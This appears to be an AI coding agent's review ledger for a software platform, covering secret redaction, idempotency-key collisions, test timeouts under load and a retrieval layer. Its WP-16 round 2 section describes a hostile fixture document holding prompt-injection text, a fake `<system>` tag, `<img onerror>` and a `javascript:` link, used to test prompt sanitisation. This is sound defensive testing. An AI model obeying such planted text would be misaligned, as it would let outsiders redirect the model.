| `slackDeliveryKey` | `event_id`, or `team.id`/`user.id`/`action_id`/`action_ts` | **was not — fixed here** |
| `fakeDeliveryKey` (3 fakes) | the fake's id header | no redactor; the fakes accept none (below) |
| loki, sentry | — | **no `inbound` member at all**, now asserted at runtime rather than read off a type |
| `external_id` on every inbound identity | delivery body fields | covered: all three `normalise` paths `redactJson` the whole parsed document *before* mapping |
| transport responses | provider documents and header names | covered at each adapter's choke point |

`packages/integrations/src/providers/delivery-key-redaction.test.ts` is the mechanical check (rule 30). Its
scope is **read off the disk** — every directory under `providers/` must have a recipe, so a sixth provider
fails it the moment the directory exists — and it drives each real registration's `create` with
`noSecretsRedactor()` as the caller's redactor, so only the adapter's own composed redactor can be what
redacts. That derivation is the point: `emitted-secrets.test.ts` derives the *member* list from
`Object.keys(port)` but its *provider* list is hand-written and covers Jira and GitLab only, which is
precisely why Slack's key sat outside it.

**Part 2 — three false exclusivity claims, not two.** `redaction.ts`'s "two sites owe it today" and
`loki/provider.ts`'s "the only provider whose object keys come from the provider" were the two briefed; the
sweep found the Loki claim **twice** in that file (docblock and the comment at `capLabelSet`), and a third,
unrelated one: `slack/http.ts` documented `nullOnError` as "`users_not_found` is the only one the adapter
uses" while `client.ts` passes `['user_not_found', 'users_not_found']` for `users.info`. All four corrected.

*No mechanical check was added for this class, deliberately.* Nothing can decide by grep which object keys
come from a provider, so a checker would either be a keyword sweep that fires on legitimate prose (the
failure mode `conflict:check` was designed around) or a hand-maintained list — the thing rule 7 forbids.
What is done instead is **stop repeating the roll in N files**: the list of sites that owe a key pass now
lives only in technical/06 § "Redact at the transport" rule 4, and both docblocks point at it and state
*why* they may not carry a count. An exclusivity claim maintained in one place can at least be reviewed;
one maintained in three is rule 41's shape applied to prose.

**Part 3 — one bound for one class, placed by measurement.** `{ timeout: 25_000 }` on both censuses, and
the vitest option-object form was proved to be honoured (mutated to `{ timeout: 1 }` → "Test timed out in
1ms") rather than assumed. Measured on this host (14 cores), load average quoted with every figure (rule 64):

| condition | load | loki census | sentry census |
|---|---|---|---|
| file alone | 11 | 1,103 ms | — |
| full unit+contract run | 17 / 26 / 29 | 2,824 / 1,754 / 1,634 ms | 1,731 / 1,404 / 1,332 ms |
| saturated | 57 | **failed** at 5 s (10,983 ms to abort) | **failed** at 5 s (8,555 ms to abort) |
| saturated, 120 s budget | 72 → 96 | **9,640 ms** | **7,531 ms** |

**This lowers the failure threshold the reviewer reported.** Rule 64 records timeouts at load ≥ 110; both
censuses in fact fail the 5 s default at load ~57, and the same work dilates **8.7x** between load 11 and
load 96. The bound: worst completed sample 9.6 s at load 96 → ~13.8 s at the load 137 this session has
actually run at → ×1.46 for the spread between two samples at one load (the reviewer's 2,488 vs 3,638 at
load 36) ≈ 20 s, so 25 s clears the distribution rather than being a round multiple of the old number
(rule 57). **Neither sample is reduced**: 192-per-million and 100,027,762 are quoted in `provider.ts`,
`mapping.ts`, `config.ts`, technical/06 and rule 32, and a census that shrinks its denominator to run
faster invalidates every citation of itself (rule 39). Both tests assert *counts* and never a duration, so
the timeout is infrastructure and not a performance guard — which is the confusion that let a 5 s default
read as a 4.5x margin.

**Assumptions recorded:** (1) 25 s is one bound for both, because they are one class and a reviewer asked
for them fixed together; (2) the fakes are out of scope for the delivery-key check, stated in its docblock
rather than silently.

**A load-generation footgun worth the ledger (sharpens rule 25).** The orchestrator retracted permission to
generate load mid-task, after two kernel panics on this host; the measurements above were already taken and
every generator was verified dead (`pgrep` clean, explicit per-PID kills, no `2>/dev/null`). But the first
attempt failed in a new way: a script holding `trap 'kill 0' EXIT INT TERM` **cannot be killed from
outside** — `kill -TERM` fires its own handler, which runs `kill 0`, which re-signals the script, and it
spun at 100% CPU until `kill -KILL`. Worse, `kill 0` also killed the `tail` on the other end of the
pipeline, so the tool call returned exit 144 with **no output**: three minutes of load generated and zero
data collected. The recipe rule 25 prescribes is right for cleanup-on-exit and wrong for a process you may
need to stop: put the trap in a wrapper that does nothing else, make each worker **self-bounding by wall
clock** so an orphan expires without any signal, and write output to a **file** rather than a pipe a trap
can kill.

### Same branch, review round 2 — the fourth instance was in the executor, and the class guard could not fail

A fresh-context reviewer returned four findings on the branch above. All four are closed, and the sweep
rule 49 asks for was run again, wider.

**1 (major) — `IntegrationActionExecutor` was the fourth instance, and it is the one that stores.**
`idempotencyStore.put(scope, request.idempotency.encode(result))` wrote provider text to persistent state
while the audit row on the *same success path* was redacted. Reproduced before it was fixed, as a test:
a `perform` returning `c-1?token=<planted>` through Slack's own plan shape (`encode` is the identity) put
the planted value straight into the store. **The sweep then found the key too** — `marker:agentic:<planted>`
reached `idempotencyStorageKey` verbatim, and technical/06's own example of a key ("marker ids for
comments") is text read back out of a provider's comment, so the key is the more likely half. Both are now
handled in the executor, the key **once where the scope is built** so `get` and `put` cannot disagree.
**Superseded in round 3:** redacting the key was the wrong half of that fix, and the two named tests listed
below for it (`keeps the injected secret out of the key it stores`, `still replays on a redacted key …`) no
longer exist. The next section says why.
Not at the call site (rule 41): one guard, four named tests, each proved by its own mutation —
`keeps the injected secret out of the value it stores`, `keeps the injected secret out of the key it
stores`, `still replays on a redacted key, so the guard cannot double-perform the action` (the mutant that
redacts on the `put` path only), and `refuses to store a value a broken redactor reshaped, rather than
storing the wrong one`. The cost is stated on `IdempotencyPlan` rather than hidden: a replay returns the
**redacted** result, so an action that cannot tolerate that must not carry an idempotency key — the same
shape as the existing "a result that cannot be JSON must not carry one".

**2 (major) — the class guard died as a collection crash, not as an assertion.**
`delivery-key-redaction.test.ts` read `CASES[provider]` at collection time behind an `as`, so the one
scenario it exists for — a new provider directory with no case — produced `TypeError: Cannot read
properties of undefined` and `Tests no tests`: a new provider **disabled** all twelve assertions instead of
failing one (rules 3, 62, 68). The case is now read inside each test through `caseFor()`, and the reviewer's
own experiment re-run: `mkdir providers/zz-newprovider` fails **three named tests** — `has a case here for
every provider directory on disk`, `zz-newprovider > has a case in this file` and `zz-newprovider > agrees
with its port about whether it has an inbound half` — while the other 16 still run. Whether the two
delivery-fed assertions apply is still decided at collection time, but defensively (`?.`), so a missing
case reaches the named failures rather than a crash; a provider with no inbound half reports them skipped.

**3 (minor) — the exclusivity claim this branch added.** "the one string in the adapter ring that the
platform stores" was falsified by finding 1 *in the same review round* (rule 63: an exclusivity claim is a
statement about every other file). Narrowed to what the file can hold itself: the dedup key of every adapter
under `providers/`, which is exactly what its own `PROVIDER_DIRECTORIES` reads off disk. The executor's
docblock took the dual fix — "three things carry it out of this file" is now four, with the reason the count
is checkable written next to it.

**4 (minor) — a table that does not exist.** `webhook_deliveries` was cited in three places; technical/03
calls it `inbox(provider, delivery_id, …)` and the key is half of that primary key (migration
`0005_events.sql`). All three now name it, and say plainly that **no endpoint writes it yet** — the route is
a later WP, which is why the check drives the registrations rather than a request.

**The sweep (rule 49), and what it found.** Every place a provider-controlled string becomes stored or keyed
state, on top of the delivery-key table above:

| path | verdict |
|---|---|
| `IdempotencyStore.put` value, and the `key` in `IdempotencyScope` | **the finding.** The value is redacted here; the **key half was changed in round 3 to a refusal** — see the next section |
| `IdempotencyPlan` call sites in production | one: `slack/digest.ts`. Covered by the executor, not by itself |
| `singletonKey` — `task:<uuid>`, `mr:<iid>` | clean: a platform uuid and a `number`. `JOB_KEY_PATTERN` bounds the shape, not the origin |
| job `data` payloads (`StageExecuteData`, `ReviewWindowData`) | clean: ids, a stage slug, an ISO instant |
| `workpadMarker` → `agentic:task:<uuid>` | clean: platform-minted, and it is the marker id an idempotency key would use |
| gate `detail` strings built from `job.name`, `status.status`, `mr.target_branch` | provider text, but downstream of the adapter's own redactor (`emitted-secrets.test.ts`) |
| `integrations.health` ← `HealthProbe.detail` | the next instance waiting: the obligation is per-provider in `common.ts`, discharged for Jira only, and nothing writes the column yet. Filed below |
| `tasks.ticket_key` (intake's unique key) | provider text in a column **by design** — it must round-trip to the provider, so redacting it would break the lookup it exists for. Out of the class |
| `inbox`, `events.payload`, `integration_actions` | no writer outside the executor today |
| **`artifacts.data`, `questions.text`, the MR fields on `tasks`** ← a run's `structuredOutput` | **the fifth instance, one ring over — filed below, not fixed here** |
| `handler_executions.error`, `event_dispatch.error` ← a thrown handler's `${name}: ${message}` | no redactor on the dispatcher path; what the executor throws is pre-scrubbed, anything else is not. Filed below |
| model output on the transcript path (`run_messages`) | clean: `claude-runner.ts`'s `append` redacts every entry before the write |

The two new ones were found by a second sweep run wide on purpose (not by the reviewer, and not by the
first census, which stopped at the adapter ring). Both were **verified by reading the sink**, not inferred
from a name: `stage-executor.ts` `data = outcome.structuredOutput` → `store.artifacts.insert(… data …)` and
`artifactQuestions(data)` → `store.questions.insert`, and `event-bus.ts`'s `describeError` →
`recordFailure` → `insert into handler_executions … error = $4`.

### Same branch, round 3 — a redacted key is not an identity, and the property nothing enforced

The approving review of round 2 left two things, both about the **key** half of the idempotency fix. Both
were reproduced before anything was changed, and the reproduction moved the fix.

**Reproduced first (the reviewer's measurement, confirmed).** A redactor holding two *different* secret
values both named `jira`: the second `execute` returned `status: 'replayed'` with the **first** request's
`{"comment_id":"comment-A"}`, `store.keys().length === 1`, and the second `perform` never ran. With
`jira_api_token` / `jira_webhook_secret` both survived: two keys, both `ok`. Separately, a **forged literal
placeholder** — provider text containing `marker:agentic:[REDACTED:integration:jira]` verbatim, which any
actor who can write a ticket comment can produce (BD-022) — came back `replayed` with the real stored
result, one key.

**The fix the measurement asked for is one guard, and it is not the one that was prescribed.** Rejecting a
duplicate name in `exactSecretRedactor` is right and is done (below), but it closes only the set one
constructor can see: **`composeSecretRedactors` has the identical hole and cannot be made to close it** —
`SecretRedactor` is two methods and no inventory, which is what lets a pattern redactor and a test double
satisfy it — and `composeSecretRedactors(options.redactor, bindingSecretRedactor([…]))` is the shape all
five adapters actually build. Measured: two composed redactors both naming a secret `jira_api_token` render
two different values identically. So a fix that stopped at the redactor would have left the production path
carrying the defect while reading as fixed (rule 63's shape, before the fact).

**What actually fails closed is refusing the key.** `idempotencyScopeFor` now throws `invalid_request` when
`redactText(key).count > 0`: nothing performed, nothing stored, no audit row — the same shape as
`assertActionName`. That is the *opposite* trade from the audit row one function away, deliberately: BD-003
obliges the row to be written, so it takes the fidelity loss; a key has no such obligation, and a lookup
that collides returns the **wrong answer** rather than a less precise one. It also settles the forgery
without knowing anything about the placeholder's format: no stored key is a redaction output any more, so a
forged one can collide with nothing but a literal copy of itself, and what remains is the property every
idempotency scheme has — whoever controls the key controls the slot, bounded by `(integration, action)`.

**Reachability, measured before the decision was made, because "is it in the threat model" is a question
about code that exists.** The repository ships **exactly one** `IdempotencyPlan`: `slack/digest.ts`'s
`slack:digest:<channel>:<day>`, whose parts are binding configuration and the clock in the schedule's zone.
Neither half was reachable through it or through anything else on disk; `grep` for `decode:` outside tests
returns that one line. The guard is for the plan technical/06 describes and nobody has written yet — "marker
ids for comments", text read back out of a provider's comment body — which is the first key an outsider
gets to influence. The decision and the attacker's requirements are written **in the code**
(`idempotencyScopeFor`'s docblock, `IdempotencyPlan`, the `IdempotencyStore` port, this file's CLAUDE.md
bullet), not only here.

**The other half, where it is decidable.** `exactSecretRedactor` refuses two secrets that share a
placeholder name, at construction, and **nothing survives** the collision (rule 38) — keeping either would
leave the other value unredacted, which is worse than failing to build, and rule 20 allows the refusal
because constructing a redactor is not an inbound notification. It was rule 18's shape exactly: a
configuration whose duplicate case silently produced a *permissive* result, held up only by the shipped
bindings happening to name every secret distinctly. `bindingSecretRedactor` does **not** skip a duplicate
the way it skips a too-short value, and says why at the line: dropping a four-character password loses
nothing, dropping one of two differently-valued secrets leaves that secret in every row the binding writes.

**Five mutations, each killed by a named test** (rules 3, 62):

| mutation | named test that died |
|---|---|
| delete the duplicate-name `throw` | `refuses two secrets that share a placeholder name`, `refuses a duplicate name even when the two values are identical` |
| `names.has(name)` → always true | `keeps two distinctly named secrets apart, placeholder and count` (+ 9 others) |
| delete the `key.count > 0` `throw` (i.e. restore round 2) | `refuses an idempotency key that carries an injected secret, storing nothing`, and `gives a forged placeholder nothing to match, because the key it would collide with is refused` — which fails on `the forger is handed its own result, never somebody else's`, the harm, not on its setup |
| `key.count > 0` → `>= 0` (refuse everything) | `leaves a key with no secret in it alone, and still replays on it` (+ 7 others) — rule 42's other side |
| drop `extraRedactions` from the `ok` row | `keeps the injected secret out of the value it stores`, on `the store scrub is counted onto the row` |

**The nit, closed both ways.** Of the two discarded `RedactionOutcome.count`s, one is now counted and the
other says at the line why it cannot be. `redactStoredJson`'s count reaches the row through
`buildEntry`'s `extraRedactions` — the store write is the one scrub that happens outside the row reporting
it, and a scrub nobody counts is indistinguishable from one that found nothing. The key's count is
structurally always zero now: a non-zero count there is a **refusal**, not a redaction, so there is no
number for a row to carry.

**Rule candidate for whoever maintains the list.** *A many-to-one transform applied to an identity is a
defect, whatever the transform is for.* Redaction, case folding, unicode normalisation and truncation all
have a legitimate reason to collapse two inputs into one, and all of them are wrong on a key: the losing
call is not told it lost, it is handed the winner's answer. The question to ask of any scrub is not "does
this hide the secret" but "is anything downstream comparing the output for equality".
*Amended in round 4*: **not always a defect — sometimes the least bad of two**. Where rule 20 forbids
refusing (an inbound notification), the collapse is kept deliberately; what the rule then demands is that
the site says **which value survives** (rule 38) and that the injective option is measured and filed rather
than left unmentioned. See the next section.

### Same branch, round 4 — the two keys reconciled, and a false "anywhere" withdrawn

Round 3 shipped the right guard with the wrong sentence around it. `redaction.ts` claimed a shared
placeholder name "is no longer an identity loss **anywhere**: the one place a redacted string was used as a
key …", repeated in `redaction.test.ts`, and `CLAUDE.md` carried the refusal and the redaction adjacently
with nothing saying why they differ. Measured false: `jira-cloud/webhook.ts`, `gitlab/webhook-verify.ts` and
`slack/signature.ts` each return `redactor.redactText(…).value` as the **delivery key**, destined for
`inbox(provider, delivery_id)`'s primary key (`0005_events.sql`), and `delivery-key-redaction.test.ts`
asserts that key *contains* the placeholder. Rule 63 inside the commit that exists to fix rule 63, and rule
44: a scope claim is a checkable claim.

**The reconciliation: the two answers are genuinely different, and rule 20 is the whole reason.** The
outbound idempotency key is about to drive a **mutation**, so refusing costs exactly one action, loudly,
before anything reaches the provider — fail closed. An inbound delivery is a **notification the platform has
already been told about**, so refusing one *drops* it and the event never reaches the pipeline — the
stuck-queue failure rule 20 was written from. Fail open. Written where the code is: `idempotencyScopeFor`
(outbound), `InboundNormaliser.deliveryKey` (inbound — the one definition all three adapters implement), a
pointer at each of the three adapter functions, the `delivery-key-redaction.test.ts` docblock, and the
`CLAUDE.md` bullet. The false "anywhere" is gone from `redaction.ts`, `redaction.test.ts` and `CLAUDE.md`,
replaced by a claim that names two sites as examples and points at this file's census as the maintained
enumeration — rule 63 says the claim cannot be maintained from inside either file.

**The residual the inbound answer keeps, said out loud (rule 38).** Redaction there is still many-to-one:
two deliveries differing *only* inside the same injected credential collapse onto one `delivery_id`, and the
**first** survives — the later, genuinely different one is taken for a redelivery and dropped without a
trace. That is a narrower version of the harm refusing would cause, not an absence of it. No instance is
demonstrated: GitLab's key parts are refnames and object ids (no `[`, no `:`), Jira's is one header value,
Slack's are ids and timestamps.

**The third option, measured and left.** A one-way digest is injective in practice *and* stores no secret,
which is what an inbound identity actually wants. It is **available** — `deliveryKey` is synchronous,
`node:crypto` is already imported by all three adapters, `delivery_id` is `text`, and the blast radius is 12
call sites with 2 literal-key assertions. It is **not cheap** where the property lives: an *unkeyed* digest
does not store "no secret" when `MIN_SECRET_LENGTH` is 8 and the surrounding template is public, and the
only key an inbound adapter holds today is the binding's own webhook secret, which is `string | null` on
GitLab (`webhook-verify.ts` — `secretToken`, `signingToken`), so the property would hold on some bindings
and silently weaken on others: rule 18's shape. A key that would not weaken (`APP_SECRET_KEY`,
`apps/server/src/config.ts`) is not plumbed to a provider registration at all. And nothing writes `inbox`
yet, so the operability half — an opaque `delivery_id` in a table technical/03 calls "dedup **and raw
audit**" — has no consumer to weigh it against. Filed under Discovered work rather than done here.

**Two minors, each closed by a named test proved with a mutation (rules 3, 10, 62):**

| change | mutation | named test that died |
|---|---|---|
| `logger.warn(logFieldsOf(request), …)` at the refusal | delete the `logger.warn` | `logs the refusal, because it writes no audit row to be found in` |
| assert the store-less branch | drop `!options.idempotencyStore` from the guard | `skips the key guard when no store is configured, and performs the action` |

The log line is **operability, not audit**: BD-003 is unharmed because nothing provider-facing happened, and
the measurement was `invalid_request`, 0 audit rows, 0 log lines, `performed 0`, `store 0` — a refusal with
no row *and* no echo of the key is a stuck action with nothing anywhere to diagnose it by, which is rule
20's second half. It logs the request's identity (`logFieldsOf`) and never the key. The store-less test
carries its own canary (rules 4, 42): the same request through an executor that *does* have a store is
refused, so the green half is the absent store and not a harmless key.



### WP-16 — the retrieval layer, and the three states that are one state if you are not careful

**The acceptance figure, and the defaults it was taken at.** "Token budget respected" is a number, so it is
*produced* rather than quoted (standing rule 39). `packages/application/src/knowledge/context-pack.test.ts`
indexes the fixture vault through the real parser and assembles a pack at
`DEFAULT_CONTEXT_BUDGET_TOKENS` — **12 000**, asserted in the same test to be the value
`PLATFORM_DEFAULT_CONFIG.project.context_budget_tokens` ships, so the figure cannot be taken at a raised cap
the way rule 39's original did. The pack totals **10 552** estimated tokens, and the same test asserts
`droppedForBudget` is **non-empty** — without that the number would only mean "the vault happened to fit",
which is not a test of a budget. The vault is **19 100** tokens, so the fill is doing work; five of its
eighteen documents are padded to a stated length for exactly that reason, and the fixture's docblock says
which and why rather than letting a reader assume the corpus is all hand-written.

> *Both figures were **10 622** and **18 886** when this paragraph was first written, and both moved at
> round 2* — the vault gained the hostile document it was missing, and `droppedForBudget` stopped carrying
> the count ceiling. Corrected in place rather than left with a footnote, because a stale number beside a
> live claim is precisely what rule 39 is about; the current values are produced by
> `context-pack.test.ts` and, for the pack total, by `context-pack.integration.test.ts` against a real
> PostgreSQL.

**The estimate is not the billed number, and the module says so at the top.** `estimateTokens` is
`ceil(chars / 4)`. Every budget in the platform is denominated in it, `run_context_pack.tokens` stores it,
and the only property the budget actually needs — never zero for text that exists — is held by `ceil` alone.
A `Math.max(1, …)` in front of it was written first and then **removed**: it is unreachable by construction,
so it is a guard no mutation can kill and rule 22's shape.

**Three states, four times.** The work package's whole risk is that "I could not" and "there was nothing"
have the same spelling, so each port returns a discriminated result and each distinction has a named test
that dies when it is removed:

- a vault that could not be read vs. a vault with no documents (`IndexReport.status`) — a failed read
  leaves the existing index in place rather than emptying it;
- an index that was never built vs. a query with no hits (`KbSearchResult`, `ContextPackResult`) — an agent
  told "no results" concludes the knowledge base is silent on the subject; an agent told `not_indexed` can
  say so to a human;
- a document the parser refused vs. a document with no frontmatter — the refused one is *not indexed*,
  because indexing it empty is where `paths:`-scoped injection silently stops happening;
- an extractor that is missing vs. a repository with no symbols (`CodeMapResult`) — see below.

**`ctags` is a name, not a program, and this machine proves it.** TD-010 says
`ctags --output-format=json`. Measured here: `/usr/bin/ctags` is **BSD ctags** (`--version` exits **1**,
`illegal option -- -`, no TypeScript parser), Homebrew has no universal-ctags installed, and the only npm
package of that name is one unmaintained `0.0.1` emscripten build. Both wrong answers produce **zero tags**,
and zero tags renders as a flawless repository map of a codebase with no code in it — which would then sit
in tier 0 of every code-stage pack for the life of the deployment. So the extractor **probes** and requires
the string `Universal Ctags` in the banner, `CodeMapper` propagates a typed `unavailable`, and
`ContextPackRequest.codeMap` is optional so the pack omits the slot. **Q57** files the decision a human owes:
where the binary comes from. A real universal-ctags **6.1.0** was obtained in an `alpine:3.20` container to
record the JSON fixture the parser is tested against, so that fixture is *recorded* and labelled as such
rather than invented (rule 17).

**Two spellings of one rule, neither trusted.** `isTier0Path` is a TypeScript predicate;
`PostgresKnowledgeStore.loadTier0` is a `where` clause. That is rule 41's shape, so the shared contract suite
runs the predicate over the corpus and demands the store return **exactly** what it selects — with
near-misses planted (a loose page at the vault root, a `rules/` directory *inside* the vault, an
`.agentic/rules-draft/` sibling), because a store that returned every document would pass a suite that only
checked the four real tier-0 paths were present. Mutating either half kills the same named test: the
TypeScript one in the contract tier, the SQL one in the integration tier, both measured.

**A defect the specification could not have told me about.** technical/07 step 2 is a *trigger*/full-text
match and product/05 calls `trigger` "the description used for matching" — and both `title` and `trigger`
live in frontmatter, which is not part of the body the chunker splits. Built literally, the trigger half of
step 2 matches nothing, ever, and no test would have noticed because every other query hits the body. It was
found by the contract suite: the query `seeded fixture user` returned the index page and not the lesson
whose *title* is those words. They are now prepended to the first chunk only, so metadata cannot out-rank a
document's own text. technical/07 is amended.

**Mutation results.** 37 mutants, **37 dead**, each by a named test, harness canaried first and the kill
predicate requiring the `>` separator that only a real test name carries (rules 21 and 62). The four that
were **alive** on the first pass are the useful part, and all four were weak *tests* rather than missing
guards: `toBe(DEFAULT_EMPHASIS)` compared the default with itself (rule 10); the glob tests had no case that
`(?:.*/)?` refuses and a bare `.*` admits (rule 43 — ask which wrong implementations your negative also
passes); the ctags parser had one "nothing at all" negative where three fields need three; and one mutant
did not apply because the formatter had reflowed the line I was matching, which the harness reported as
`NOT-APPLIED` rather than as a kill.

**What is not done, in the reviewer's sentence form.** *The retrieval layer is built and no prompt uses it.*
`basicStageRunPlanner` still passes `contextPack: []` and `stage-executor.ts` still writes a zeroed
`ContextPackRecord`; nothing composes a `PlatformToolPort`, so `kb_search` has no home; and the indexer is
not registered as a job, because the checkout it would read needs the ingress backlog entry 1 says does not
exist. All three are in "Discovered work" with the work package that owns each. WP-18 and WP-21 consume the
assembler, the store and the tool directly, which is what they were built for.


### WP-16 review round 2 — the retrieval step returned nothing in production, and the fake hid it

Six findings, three of them major. Two changed the product rather than the tests, and the second is
the one worth reading.

**The ranking had no oracle, and `37/37` was a claim about the mutants I chose.** Review mutated
`DAMPING 0.85 → 0.5`, `sqrt(occurrences)/targets.length → occurrences`, and the definer division
away: all three **alive** across 13 files and 215 tests — precisely the three modelling choices the
module's docblock spends three paragraphs justifying. `graph.oracle.test.ts` now audits them with
three hand-written graphs whose edge weights are written from the *sentence* rather than produced by
`buildEdges`, plus a closed form for the two-file case (`a = 1/(2+d)`, solved by algebra in the
comment, `0.3509` at 0.85 against `0.4` at 0.5). Each mutation dies by name, and each has a
`not.toBeCloseTo` against the *alternative* model beside it so a reader can see the assertion
discriminates (rule 43). Its docblock states what it shares with the implementation — the power
iteration, not the weights, not the constant — and what it therefore cannot catch (rule 65).

**The measurement that changed the product.** Chasing "no precision test", the real defect turned up
underneath it: `websearch_to_tsquery` joins bare words with **AND**, so passing the raw task text —
which is what round 1 did — matched **0 documents** against a real PostgreSQL for the acceptance
query, while the in-memory double returned **15**. Every retrieval test in the work package was
exercising a path production did not have, and the fake was on the kind side of standing rule 1.
technical/07 says "task **keywords**" and round 1 read it as "task text". Closed by extracting
keywords (`extractQueryTerms`) and joining them with `OR` at the adapter; the port now carries
`terms`, which also means no byte of untrusted text is ever concatenated into a tsquery.

**And the prescribed fix for the finding was wrong — including my own replacement for it.** Review
asked for a relevance floor. *Absolute* is backwards: `"the"` ranks padded pages at **0.947** and a
good query ranks its correct answer at **0.048**, because `ts_rank_cd` measures cover density.
*Relative to the best text score* is store-dependent: the correct second answer sits at **0.667** of
the best against PostgreSQL and **0.267** against the double, same corpus, same query — so the
ratio I had drawn at 0.3 from the PostgreSQL numbers dropped the right page on the store the
acceptance figure is measured on. **No floor shipped**; the degenerate query is removed at the
query, where it is store-independent, and `retrieval.ts` carries both measurements as the reason.
Rule 27, with the implementer wrong about their own patch this time.

**The fixture vault had no hostile document** (rule 45), and review's own one flowed byte-identical
to the prompt. It now carries `hostile-document.md` — injection text, `<system>`, `<img onerror>`,
a `javascript:` link, ANSI `ESC[31m`, a NUL, `U+202E`, and a line impersonating the platform's own
chunk prefix — and three consumers assert the split: control characters and bidi overrides are
**replaced and counted**, hostile *words* survive **unchanged** because delimiting them is WP-17's
and an indexer that edited words could not hold a page about XSS. The NUL is not decoration: a
PostgreSQL `text` column refuses one, so one vault page would have failed an entire index run.

**Three smaller ones.** `droppedForBudget` conflated the budget, the count ceiling and a tier-0
overrun, which made the acceptance test's own warrant unsound — a true conclusion resting on an
argument that did not support it; the causes are separate lists now and one test drives all three.
The padding paragraph's "contains none of the query terms" was false (`a`, `its`, `the`); narrowed
to the true claim and **enforced** by `fixture-vault.test.ts`, which intersects the paragraph's
keywords with every query the retrieval tests use. The ctags provenance was prose inside a docblock
citing rule 17, outside the reach of `fixture-provenance.contract.test.ts` (which walks
`test/fixtures/http/` only) — the fixture is **not** moved there, because a subprocess's stdout has
no URL, host or interaction and forcing it in would make that suite admit a shape it cannot check;
instead `RECORDED_WITH` carries the invocation as data and a test holds it to `CTAGS_ARGUMENTS`.

**The open question the coordinator asked to be answered rather than assumed.** Pinning pack
composition against the real store was cheap, so it is pinned: `context-pack.integration.test.ts`
assembles over PostgreSQL and asserts tier 0, the path match, the cross-domain negatives, and its
own token figure. Measured, the two stores agree at **10 552** on this corpus; the figures are kept
as two independent literals anyway, so the day they diverge the failing test names which store
moved.

**Mutation results, round 2 — and two of the three claims in this paragraph were false.** It said
"54 mutants, 52 dead in the harness", excused one remainder as an unreachable guard and called the
other dead by "two named tests". Round 3 measured all three: there **was no early-return line** to
be unreachable (a mutation-restore cycle had removed it and a comment was written describing it
anyway), so the 54-mutant tally counted a phantom; and `join(' ')` killed **one** named test, not
two, because the test named for the defect did not catch it. See round 3 for the corrected figures.
The paragraph is left standing rather than rewritten, because a ledger that edits its own wrong
numbers out of existence is one nobody can audit.


### WP-16 review round 3 — a comment described a line that was not in the tree

Three majors and three minors. The first is the one that matters, because it is about the ledger
rather than about the code.

**A justification that named something that does not exist.** Round 2 claimed the Postgres adapter
carried a deliberately-unreachable `if (terms.length === 0)` early return, documented it at the
line under standing rule 22, wrote it into this ledger, and counted it as the 54th mutant. **There
was no line.** A mutation-restore cycle had removed it and the comment was written from memory of
the code rather than from the code. Rule 11's shape one level worse — rule 11 is a justification
citing a test that does not exist; this is a justification citing *itself*. The mechanism is real
(`websearch_to_tsquery('simple', '')` builds an empty tsquery and `@@` matches no row), so the
adapter now **names PostgreSQL as the mechanism** and points at the contract case that pins the
behaviour, and claims no guard of its own. Corrected tally, reproducible: **54 mutants, 54 dead** —
52 through the harness, 2 at the integration tier by hand.

**A test named for a defect it did not catch.** Round 2's integration test — the one called
*retrieves at all, the defect a fake-only tier could not see* — **survived**
`join(' OR ') → join(' ')`, because the task's touched paths keep two `paths` matches in tier 1 and
`tier1.length > 0` stayed true. Rules 43 and 45: it was named for the property it was hoped to have.
It is now `context-pack.integration.test.ts` › "admits a document the *text query* found, not merely
one a path glob claimed".
It now asserts a tier-1 entry whose `reason` is `trigger`, and a second case runs with **no** touched
paths so the text query is the only signal there is. Measured: the mutation now kills **4** named
tests (3 here, 1 in the contract suite against Postgres) where it killed 1.

**The fake is still kinder, and the register said it was not.** Row 1b claimed the port change made
"both stores match the same set". Measured over the fixture vault, query `knowledge technical
session`: **pg 11 documents, fake 13**, `onlyFake = [hostile-document.md, billing.md]`,
`onlyPg = []`. The cause, reproduced with `ts_debug`: PostgreSQL's `simple` parser has **token
types** and reads `.agentic/knowledge/technical/session-service.md` as a single `file` lexeme
(likewise `v1.2.3` → `file`, `10.0.0.1` → `version`, `a@b.test` → `email`), while `chunkTerms`
splits all of them — so, because every chunk is prefixed with its own path, **path words are
searchable in the fake and not in production**. New row **1c** records it with the numbers and the
instruction that follows (never write a test that depends on a path word matching). New row **1d**
records the divergence that was missing entirely and is the kindest in the file — a `U+0000` that
the fake accepts and PostgreSQL refuses outright — and rule 12 says the kindest divergence needs a
**positive assertion**: `nul-refusal.integration.test.ts` drives the real adapter with the sanitiser
bypassed and asserts the refusal, with the mirrored case asserting the sanitiser closes it (rule 42).
It is a **file of its own** because measured, leaving it in `context-pack.integration.test.ts` made
the sanitiser mutation throw in `beforeAll`, which vitest reports as a failing *file* — rule 62,
which says that is not a failing test.

**Three minors, all of them false citations.** `query.ts` pointed at "the floor in `retrieval.ts`"
and no floor ships; `sanitise.ts` attributed the NUL case to the wrong test file; and
`ctags.test.ts` labelled its fixture `kind: 'recorded'`, a token that is **not** in
`PROVENANCE_KINDS` (`documented | documented-adapted | composed | inferred | invented`) and was
asserted against its own `as const`. The taxonomy is about how a fixture relates to a vendor's
documentation and has no member for "the stdout of a process that ran", so the field is renamed to a
sentence, the tautology is replaced by an assertion that no `kind` is present, and the docblock says
plainly that the file sits outside the sweep and why.

**One claim narrowed rather than fixed.** `retrieval.ts` said keyword extraction "removed the
measured harm". It removes tokens of **three characters or fewer** and nothing more: review's query
of thirteen four-letter-or-longer function words returns 10 documents at 0.900/0.898/0.898/0.898 and
fills **10 707 of 12 000** with six tier-1 documents, top score **0.718** — above a good query's
correct answer at 0.500. The 87 %-padding pack is still reachable. The remedy needs a corpus-derived
signal (IDF, or a different `ts_rank` normalisation) and is a product decision filed outside this
work package; the sentence now says what was closed and what was not.

### Architect ruling (WP-18 / backlog 26, session 5) — the index reads a bare mirror the platform owns, and never the launcher's

**Asked before WP-18 was briefed**, because backlog 26 found that composing the workspace provider gives
WP-18 no checkout it can read: the only `VaultSource` adapter walks the server's own filesystem and the
platform's checkouts live on volumes the server never mounts. Three shapes were on the table — (a) a
platform-side clone of its own, (b) a default-branch read through `GitProviderPort`, (c) mounting the
launcher's `repo-cache` read-only into the server.

**Ruling: (a), sharpened — a git-backed `VaultSource` over a platform-side bare mirror.** Recorded as
**TD-026** (`docs/decisions/technical/TD-026-knowledge-vault-read-path.md`), with an amendment to TD-021
and paragraphs in technical/05, /07 and /12; the WP-18 row is rewritten with the criteria; **Q63** files
the mirror disk budget; `docs/research/13-bare-mirror-vault-read.md` carries the measurements. WP-18
